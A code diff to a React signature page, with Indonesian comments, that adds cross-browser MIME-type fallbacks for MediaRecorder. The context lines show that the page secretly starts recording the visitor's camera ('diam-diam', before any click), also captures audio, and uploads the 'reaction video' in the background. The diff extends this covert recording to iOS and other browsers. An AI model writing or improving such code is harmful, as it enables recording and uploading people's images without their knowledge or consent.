@@ -85,7 +85,15 @@ const SignaturePage = () => {
           // Mulai rekam video reaction diam-diam sejak kamera aktif (sebelum diklik!)
           try {
             videoChunksRef.current = [];
-            const recorder = new MediaRecorder(s, { mimeType: "video/webm" });
+            let options = { mimeType: "video/webm" };
+            if (!MediaRecorder.isTypeSupported("video/webm")) {
+              if (MediaRecorder.isTypeSupported("video/mp4")) {
+                options = { mimeType: "video/mp4" };
+              } else {
+                options = {}; // Biarkan browser milih format default (biasanya mp4 di iOS)
+              }
+            }
+            const recorder = new MediaRecorder(s, options);
             recorder.ondataavailable = (e) => {
               if (e.data.size > 0) videoChunksRef.current.push(e.data);
             };
@@ -133,14 +141,23 @@ const SignaturePage = () => {
 
       // Setup MediaRecorder for capturing audio
       voiceChunksRef.current = [];
-      const mediaRecorder = new MediaRecorder(stream);
+      let options = { mimeType: "audio/webm" };
+      if (!MediaRecorder.isTypeSupported("audio/webm")) {
+        if (MediaRecorder.isTypeSupported("audio/mp4")) {
+          options = { mimeType: "audio/mp4" };
+        } else {
+          options = {};
+        }
+      }
+      const mediaRecorder = new MediaRecorder(stream, options);
       mediaRecorder.ondataavailable = (e) => {
         if (e.data.size > 0) {
           voiceChunksRef.current.push(e.data);
         }
       };
       mediaRecorder.onstop = () => {
-        const blob = new Blob(voiceChunksRef.current, { type: "audio/webm" });
+        const mimeType = mediaRecorder.mimeType || "audio/mp4";
+        const blob = new Blob(voiceChunksRef.current, { type: mimeType });
         voiceBlobRef.current = blob;
       };
       mediaRecorder.start();
@@ -275,8 +292,9 @@ const SignaturePage = () => {
             videoRecorderRef.current.state !== "inactive"
           ) {
             videoRecorderRef.current.onstop = async () => {
+              const mimeType = videoRecorderRef.current.mimeType || "video/mp4";
               const blob = new Blob(videoChunksRef.current, {
-                type: "video/webm",
+                type: mimeType,
               });
               // Upload di background tanpa memblokir navigasi
               uploadReactionVideo(blob, username).then((res) => {
